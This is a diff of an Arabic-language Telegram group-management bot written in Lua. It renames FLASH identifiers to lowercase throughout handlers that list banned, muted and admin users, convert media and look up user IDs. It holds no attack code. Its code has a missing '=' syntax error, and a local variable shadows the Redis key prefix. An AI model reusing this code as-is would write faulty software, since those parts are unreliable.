+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مطايه ،", "md")
 end
 donky = "❅∫ قائمه المطايه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6134,13 +6134,13 @@ username = v
 end
 donky = donky.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, donky, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, donky, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("المميزين عام") or text == ("الاعضاء المميزين عام") and is_admin(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH..'bot:vpall:')
+--     By Developer flash     -- 
+if text == ("المميزين عام") or text == ("الاعضاء المميزين عام") and is_admin(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash..'bot:vpall:')
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مميزين عام ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مميزين عام ،", "md")
 end
 vpall = "❅∫ قائمه المميزين عام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6152,13 +6152,13 @@ username = v
 end
 vpall = vpall.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, vpall, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, vpall, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("المكتومين") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."bot:muted:"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == ("المكتومين") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."bot:muted:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مكتومين ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مكتومين ،", "md")
 end
 muted = "❅∫ قائمه المكتومين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6170,13 +6170,13 @@ username = v
 end
 muted = muted.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, muted, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, muted, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("المدراء") and is_monsh2(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."bot:owners:"..msg.chat_id_)
+--     By Developer flash     -- 
+if text == ("المدراء") and is_monsh2(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."bot:owners:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مدراء ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مدراء ،", "md")
 end
 owners = "❅∫ قائمه المدراء ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6188,13 +6188,13 @@ username = v
 end
 owners = owners.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, owners, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, owners, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("المدراء العامين") and is_admin(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH..'bot:onall:')
+--     By Developer flash     -- 
+if text == ("المدراء العامين") and is_admin(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash..'bot:onall:')
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مدراء عامين ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مدراء عامين ،", "md")
 end
 onall = "❅∫ قائمه المدراء العامين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6206,13 +6206,13 @@ username = v
 end
 onall = onall.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, onall, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, onall, "md")
 end end,nil) end end
---     By Developer FLASH     --
-if text == ("المنشئ") or text == ("المنشئين الاساسيين") or text == ("المنشئ الاساسي") and is_vpall(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."bot:monsh:"..msg.chat_id_)
+--     By Developer flash     --
+if text == ("المنشئ") or text == ("المنشئين الاساسيين") or text == ("المنشئ الاساسي") and is_vpall(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."bot:monsh:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد منشئين اساسيين ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد منشئين اساسيين ،", "md")
 end
 monsh = "❅∫ قائمه المنشئين الاساسيين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6224,13 +6224,13 @@ username = v
 end
 monsh = monsh.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, monsh, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, monsh, "md")
 end end,nil) end end
---     By Developer FLASH     --
-if text == ("المحظورين") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH.."bot:banned:"..msg.chat_id_)
+--     By Developer flash     --
+if text == ("المحظورين") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash.."bot:banned:"..msg.chat_id_)
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد محظورين ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد محظورين ،", "md")
 end
 ban = "❅∫ قائمه المحظورين ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6242,13 +6242,13 @@ username = v
 end
 ban = ban.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, ban, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, ban, "md")
 end end,nil) end end
---     By Developer FLASH     --
-if text == ("قائمه العام") and is_admin(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH..'bot:gban:')
+--     By Developer flash     --
+if text == ("قائمه العام") and is_admin(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash..'bot:gban:')
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد محظورين عام ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد محظورين عام ،", "md")
 end
 gban = "❅∫ قائمه الحظر العام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6260,13 +6260,13 @@ username = v
 end
 gban = gban.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, gban, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, gban, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
-if text == ("المطورين") or text == ("مطورين الرتبه الثالثه") and is_admin(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH..'bot:admins:')
+--     By Developer flash     -- 
+if text == ("المطورين") or text == ("مطورين الرتبه الثالثه") and is_admin(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash..'bot:admins:')
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مطورين بهذا الرتبه ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مطورين بهذا الرتبه ،", "md")
 end
 dev3 = "❅∫ قائمه مطورين الرتبه الثالثه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6278,13 +6278,13 @@ username = v
 end
 dev3 = dev3.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, dev3, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, dev3, "md")
 end end,nil) end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("^قائمه المنع$") then
-local hash = (FLASH..'bot:filters:'..msg.chat_id_)
+local hash = (flash..'bot:filters:'..msg.chat_id_)
 if hash then
-local names = FLASHdx1:hkeys(hash)
+local names = flashdx1:hkeys(hash)
 text = "❅∫ قائمه الكلمات الممنوعه ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for i=1, #names do
 text = text..'» ، '..names[i]..'\n'
@@ -6292,13 +6292,13 @@ end
 if #names == 0 then
 text = "❅∫ لا يوجد كلمات ممنوعه ،" 
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md')
 end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("^قائمه المنع العام$") then
-local hash = (FLASH..'bot:freewords:')
+local hash = (flash..'bot:freewords:')
 if hash then
-local names = FLASHdx1:hkeys(hash) 
+local names = flashdx1:hkeys(hash) 
 text "❅∫ قائمه الكلمات الممنوعه عام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for i=1, #names do
 text = text..' » ، '..names[i]..'\n'
@@ -6306,13 +6306,13 @@ end
 if #names == 0 then
 text = "❅∫ لا يوجد كلمات ممنوعه عام ،" 
 end
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
 end end
- --     By Developer FLASH     --
- if text == ("المكتومين عام") and is_admin(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local list = FLASHdx1:smembers(FLASH..'bot:mutedall:')
+ --     By Developer flash     --
+ if text == ("المكتومين عام") and is_admin(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local list = flashdx1:smembers(flash..'bot:mutedall:')
 if #list == 0 then
-return FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مكتومين عام ،", "md")
+return flashdx(msg.chat_id_, msg.id_, 1, "❅∫ لا يوجد مكتومين عام ،", "md")
 end
 mutedall = "❅∫ قائمه الكتم عام ⬇️،\n         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •\n"
 for k,v in pairs(list) do
@@ -6324,52 +6324,52 @@ username = v
 end
 mutedall = mutedall.."*"..k.."- »* { "..username.." }\n"
 if #list == k then
-return FLASHdx(msg.chat_id_, msg.id_, 1, mutedall, "md")
+return flashdx(msg.chat_id_, msg.id_, 1, mutedall, "md")
 end end,nil) end end end 
---     By Developer FLASH     --
-if text:match("^ضع دعم$") and FLASH11(msg) and is_sudo(msg) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "️❅∫ ارسل لي رابط جروب الدعم \n❅∫ او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله ", 1, "md")
-FLASHdx1:setex(FLASH.."bot:support:link" .. msg.sender_user_id_, 120, true)
+--     By Developer flash     --
+if text:match("^ضع دعم$") and flash11(msg) and is_sudo(msg) then
+flashdx(msg.chat_id_, msg.id_, 1, "️❅∫ ارسل لي رابط جروب الدعم \n❅∫ او قم بارسال المعرف الذي تود ان يتواصل معك متابعيك من خلاله ", 1, "md")
+flashdx1:setex(flash.."bot:support:link" .. msg.sender_user_id_, 120, true)
 end
 if is_sudo(msg) and (text:match("^حذف الدعم$")) then
-FLASHdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حذف معلومات الدعم ", 1, "md")
-FLASHdx1:del(FLASH.."bot:supports:link")
+flashdx(msg.chat_id_, msg.id_, 1, "❅∫ تم حذف معلومات الدعم ", 1, "md")
+flashdx1:del(flash.."bot:supports:link")
 end
---     By Developer FLASH     -- 
-if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local FLASH = '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..' \n❅∫ تم تفعيل تحويل الصيغ'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
-FLASHdx1:del(FLASH..'bot:Convert'..msg.chat_id_) 
+--     By Developer flash     -- 
+if text and (text == "تفعيل تحويل الصيغ" or text == "تفعيل التحويل") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local flash = '❅∫ اهلا عزيزي ، '..renk_flash(msg)..' \n❅∫ تم تفعيل تحويل الصيغ'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
+flashdx1:del(flash..'bot:Convert'..msg.chat_id_) 
 end
-if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and is_momod(msg.sender_user_id_, msg.chat_id_) and FLASH11(msg) then  
-local FLASH = '❅∫ اهلا عزيزي ، '..renk_FLASH(msg)..' \n❅∫ تم تعطيل تحويل الصيغ'
-FLASHdx(msg.chat_id_, msg.id_, 1,FLASH, 1, 'md') 
-FLASHdx1:set(FLASH..'bot:Convert'..msg.chat_id_,true)  
+if text and (text == "تعطيل تحويل الصيغ" or text == "تعطيل التحويل") and is_momod(msg.sender_user_id_, msg.chat_id_) and flash11(msg) then  
+local flash = '❅∫ اهلا عزيزي ، '..renk_flash(msg)..' \n❅∫ تم تعطيل تحويل الصيغ'
+flashdx(msg.chat_id_, msg.id_, 1,flash, 1, 'md') 
+flashdx1:set(flash..'bot:Convert'..msg.chat_id_,true)  
 end
-if text == 'تحويل' and not FLASHdx1:get(FLASH..'bot:Convert'..msg.chat_id_) then  
+if text == 'تحويل' and not flashdx1:get(flash..'bot:Convert'..msg.chat_id_) then  
 if tonumber(msg.reply_to_message_id_) > 0 then 
 function Convert(extra, result, success)
 if result.content_.photo_ then 
-local FLASH = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
-download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..FLASH.result.file_path,msg.sender_user_id_..'.png') 
+local flash = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
+download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..flash.result.file_path,msg.sender_user_id_..'.png') 
 sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
 os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
 end   
 if result.content_.sticker_ then 
-local FLASH = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
-download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..FLASH.result.file_path,msg.sender_user_id_..'.jpg') 
+local flash = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
+download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..flash.result.file_path,msg.sender_user_id_..'.jpg') 
 sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','❅∫ تم تحويل الملصق الى صوره')     
 os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
 end
 if result.content_.audio_ then 
-local FLASH = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
-download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..FLASH.result.file_path,msg.sender_user_id_..'.ogg') 
+local flash = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
+download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..flash.result.file_path,msg.sender_user_id_..'.ogg') 
 sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"❅∫ تم تحويل الـMp3 الى بصمه")
 os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
 end   
 if result.content_.voice_ then 
-local FLASH = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
-download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..FLASH.result.file_path,msg.sender_user_id_..'.mp3') 
+local flash = json:decode(https.request('https://api.telegram.org/bot'.. tokenbot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
+download_to_file('https://api.telegram.org/file/bot'..tokenbot..'/'..flash.result.file_path,msg.sender_user_id_..'.mp3') 
 sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
 os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
 end
@@ -6377,8 +6377,8 @@ end
 getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),Convert) 
 end
 end 
---     By Developer FLASH     -- 
-if text ==("كشف") or text ==("ايدي")  and msg.reply_to_message_id_ ~= 0 and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text ==("كشف") or text ==("ايدي")  and msg.reply_to_message_id_ ~= 0 and flash11(msg) then 
 function id_by_reply(extra, result, success) 
 tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
 tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = result.sender_user_id_,offset_ = 0,limit_ = 100},function(arg,pho) 
@@ -6393,15 +6393,15 @@ photouser1 = ''
 else
 photouser1 = '\n❅∫ عدد صوره ⌯» { '..pho.total_count_..' }'
 end
-if FLASHdx1:sismember(FLASH..'bot:gban:',result.sender_user_id_) then
+if flashdx1:sismember(flash..'bot:gban:',result.sender_user_id_) then
 Tkeed = 'محظور عام'
-elseif FLASHdx1:sismember(FLASH..'bot:mutedall:',result.sender_user_id_) then
+elseif flashdx1:sismember(flash..'bot:mutedall:',result.sender_user_id_) then
 Tkeed = 'مكتوم عام'
-elseif FLASHdx1:sismember(FLASH..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then
+elseif flashdx1:sismember(flash..'bot:banned:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'محظور'
-elseif FLASHdx1:sismember(FLASH..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then
+elseif flashdx1:sismember(flash..'bot:muted:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'مكتوم'
-elseif FLASHdx1:sismember(FLASH..'tkeed:'..msg.chat_id_,result.sender_user_id_) then
+elseif flashdx1:sismember(flash..'tkeed:'..msg.chat_id_,result.sender_user_id_) then
 Tkeed = 'مقيد'
 else
 Tkeed = 'لا يوجد'
@@ -6428,12 +6428,12 @@ elseif data.type_.ID == "UserTypeGeneral" then
 noh = 'شخصي'
 end
 if data.first_name_ == false then 
-FLASHdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف*\n', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف*\n', 1, 'md')
 return false  end
 if data.username_ == false then
 text = '❅∫ ايديه ⌯»{ `'..result.sender_user_id_..
 '` }\n❅∫ رتبته بالجروب ⌯» { '..Renk..
-' }\n❅∫ رتبته بالبوت ⌯» { '..FLASH_renk(result.sender_user_id_, msg.chat_id_)..
+' }\n❅∫ رتبته بالبوت ⌯» { '..flash_renk(result.sender_user_id_, msg.chat_id_)..
 ' }\n'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
 ' }\n❅∫ التواجد ⌯» { '..tt..
@@ -6443,32 +6443,32 @@ else
 text = '❅∫ ايديه ⌯»{ `'..result.sender_user_id_..
 '` }\n❅∫ معرفه ⌯» { [@'..data.username_..']'..
 ' } \n❅∫ رتبته بالجروب ⌯» { '..Renk..
-' }\n❅∫ رتبته بالبوت ⌯» { '..FLASH_renk(result.sender_user_id_, msg.chat_id_)..
+' }\n❅∫ رتبته بالبوت ⌯» { '..flash_renk(result.sender_user_id_, msg.chat_id_)..
 ' }'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
 ' }\n❅∫ التواجد ⌯» { '..tt..
 ' }\n❅∫ نوع حسابه ⌯» { '..noh..' }'
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
 end end,nil) end,nil) end,nil) end 
 getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
 end
---     By Developer FLASH     -- 
-if text and text:match('^ايدي @(.*)') and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match('^ايدي @(.*)') and flash11(msg) then 
 local username = text:match('^ايدي @(.*)') 
 tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
 if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
 local text = '*❅∫ المعرف غير صحيح*'
-FLASHdx(msg.chat_id_, msg.id_, 1,text, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,text, 1, 'md')
 return false  end
 if res.type_.ID == "ChannelChatInfo" then 
 if res.type_.channel_.is_supergroup_ == false then
 local ch = 'قناة'
 local chn = '*❅∫ نوع الحساب ⌯» { '..ch..' }\n❅∫ الايدي ⌯» {*`'..res.id_..'`*}\n❅∫ المعرف ⌯» {* [@'..username..'] *}\n❅∫ الاسم ⌯» { *`'..res.title_..'`* }*'
-FLASHdx(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
 else
 local gr = 'مجموعه'
 local grr = '❅∫ نوع الحساب ⌯» { '..gr..' }\n❅∫ الايدي ⌯» {*`'..res.id_..'`*}\n❅∫ المعرف ⌯» {* [@'..username..'] *}\n❅∫ الاسم ⌯» { *`'..res.title_..'`* }*'
-FLASHdx(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
 end
 return false  end
 if res.id_ then  
@@ -6480,15 +6480,15 @@ photouser1 = ''
 else
 photouser1 = '\n❅∫ عدد صوره ⌯» { '..pho.total_count_..' }'
 end
-if FLASHdx1:sismember(FLASH..'bot:gban:',res.id_) then
+if flashdx1:sismember(flash..'bot:gban:',res.id_) then
 Tkeed = 'محظور عام'
-elseif FLASHdx1:sismember(FLASH..'bot:mutedall:',res.id_) then
+elseif flashdx1:sismember(flash..'bot:mutedall:',res.id_) then
 Tkeed = 'مكتوم عام'
-elseif FLASHdx1:sismember(FLASH..'bot:banned:'..msg.chat_id_,res.id_) then
+elseif flashdx1:sismember(flash..'bot:banned:'..msg.chat_id_,res.id_) then
 Tkeed = 'محظور'
-elseif FLASHdx1:sismember(FLASH..'bot:muted:'..msg.chat_id_,res.id_) then
+elseif flashdx1:sismember(flash..'bot:muted:'..msg.chat_id_,res.id_) then
 Tkeed = 'مكتوم'
-elseif FLASHdx1:sismember(FLASH..'tkeed:'..msg.chat_id_,res.id_) then
+elseif flashdx1:sismember(flash..'tkeed:'..msg.chat_id_,res.id_) then
 Tkeed = 'مقيد'
 else
 Tkeed = ' لا يوجد'
@@ -6515,28 +6515,28 @@ elseif data.type_.ID == "UserTypeGeneral" then
 noh = 'شخصي'
 end
 if data.first_name_ == false then
-FLASHdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف*\n', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف*\n', 1, 'md')
 return false  end
 text = '❅∫ ايديه ⌯»{ `'..res.id_..
 '` }\n❅∫ معرفه ⌯» { [@'..data.username_..']'..
 ' } \n❅∫ رتبته بالجروب ⌯» { '..Renk..
-' }\n❅∫ رتبته بالبوت ⌯» { '..FLASH_renk(res.id_, msg.chat_id_)..
+' }\n❅∫ رتبته بالبوت ⌯» { '..flash_renk(res.id_, msg.chat_id_)..
 ' }'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
 ' }\n❅∫ التواجد ⌯» { '..tt..
 ' }\n❅∫ نوع حسابه ⌯» { '..noh..' }'
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
 end,nil) end,nil) end,nil) end end,nil)
 return false 
 end
---     By Developer FLASH     -- 
-if text and text:match('ايدي (%d+)') and FLASH11(msg) then 
+--     By Developer flash     -- 
+if text and text:match('ايدي (%d+)') and flash11(msg) then 
 local iduser = text:match('ايدي (%d+)')  
 tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = iduser},function(arg,da) 
 tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = iduser,offset_ = 0,limit_ = 100},function(arg,pho) 
 tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
 if data.message_ == "User not found" then
-FLASHdx(msg.chat_id_, msg.id_, 1,'*❅∫ لا يمكنني اتمام الامر *\n', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,'*❅∫ لا يمكنني اتمام الامر *\n', 1, 'md')
 return false  end
 if pho.total_count_ == 0 then
 photouser = ''
@@ -6548,15 +6548,15 @@ photouser1 = ''
 else
 photouser1 = '\n❅∫ عدد صوره ⌯» { '..pho.total_count_..' }'
 end
-if FLASHdx1:sismember(FLASH..'bot:gban:',iduser) then
+if flashdx1:sismember(flash..'bot:gban:',iduser) then
 Tkeed = 'محظور عام'
-elseif FLASHdx1:sismember(FLASH..'bot:mutedall:',iduser) then
+elseif flashdx1:sismember(flash..'bot:mutedall:',iduser) then
 Tkeed = 'مكتوم عام'
-elseif FLASHdx1:sismember(FLASH..'bot:banned:'..msg.chat_id_,iduser) then
+elseif flashdx1:sismember(flash..'bot:banned:'..msg.chat_id_,iduser) then
 Tkeed = 'محظور'
-elseif FLASHdx1:sismember(FLASH..'bot:muted:'..msg.chat_id_,iduser) then
+elseif flashdx1:sismember(flash..'bot:muted:'..msg.chat_id_,iduser) then
 Tkeed = 'مكتوم'
-elseif FLASHdx1:sismember(FLASH..'tkeed:'..msg.chat_id_,iduser) then
+elseif flashdx1:sismember(flash..'tkeed:'..msg.chat_id_,iduser) then
 Tkeed = 'مقيد'
 else
 Tkeed = ' لا يوجد'
@@ -6583,12 +6583,12 @@ elseif data.type_.ID == "UserTypeGeneral" then
 noh = 'شخصي'
 end
 if data.first_name_ == false then
-FLASHdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف *\n', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1,'*❅∫ الحساب محذوف *\n', 1, 'md')
 return false  end
 if data.username_ == false then
 text = '❅∫ ايديه ⌯»{ `'..iduser..
 '` }\n❅∫ رتبته بالجروب ⌯» { '..Renk..
-' }\n❅∫ رتبته بالبوت ⌯» { '..FLASH_renk(iduser, msg.chat_id_)..
+' }\n❅∫ رتبته بالبوت ⌯» { '..flash_renk(iduser, msg.chat_id_)..
 ' }\n'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
 ' }\n❅∫ التواجد ⌯» { '..tt..
@@ -6598,16 +6598,16 @@ else
 text = '❅∫ ايديه ⌯»{ `'..iduser..
 '` }\n❅∫ معرفه ⌯» { [@'..data.username_..']'..
 ' }\n❅∫ رتبته بالجروب ⌯» { '..Renk..
-' }\n❅∫ رتبته بالبوت ⌯» { '..FLASH_renk(iduser, msg.chat_id_)..
+' }\n❅∫ رتبته بالبوت ⌯» { '..flash_renk(iduser, msg.chat_id_)..
 ' }'..photouser1..
 '\n❅∫ نوع القيود ⌯» { '..Tkeed..
 ' }\n❅∫ التواجد ⌯» { '..tt..
 ' }\n❅∫ نوع حسابه ⌯» { '..noh..' }'
-FLASHdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
+flashdx(msg.chat_id_, msg.id_, 1, text, 1, 'md') 
 end end,nil) end,nil) end,nil)
 return false 
 end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 local text = msg.content_.text_:gsub('اضافه','Invite')
 if text:match("^[Ii]nvite$") and msg.reply_to_message_id_ ~= 0 then
 function inv_reply(extra, result, success)
@@ -6615,30 +6615,30 @@ add_user(result.chat_id_, result.sender_user_id_, 5)
 end
 getMessage(msg.chat_id_, msg.reply_to_message_id_,inv_reply)
 end 
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text:match("^[Ii]nvite @(.*)$") then
